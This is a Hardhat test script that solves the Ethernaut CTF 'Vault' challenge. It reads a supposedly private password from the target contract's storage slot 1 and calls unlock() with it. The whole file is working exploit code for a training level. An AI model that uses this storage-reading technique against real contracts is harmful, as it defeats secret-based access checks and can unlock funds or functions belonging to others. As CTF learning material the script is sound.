import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";
import { stat } from "fs";

describe("Vault", function(){
    it("Aims to Solve the Vault Question of the Ethernaut CTF", async function(){
        
        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function unlock(bytes32 _password) public", 
            "function locked() public view returns (bool)",
        ]

        const targetAddr = "0xD56F0825c6AbE465D981D76705376d699197eF51"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Initial Lock Status Check
        let status = await targetCont.locked();
        console.log(`Current Status: ${status}`);

        // Read the private variable password from the ABI
        let passwordVal = await eoa.provider!.getStorageAt(targetAddr, 1);
        console.log(`Current Status: ${passwordVal}`);

        // Call the unlock function with the newly acquired password value
        let transaction = await targetCont.unlock(passwordVal);
        await transaction.wait()

        // Final Check
        status = await targetCont.locked();
        expect(status).to.eq(false);
    });
});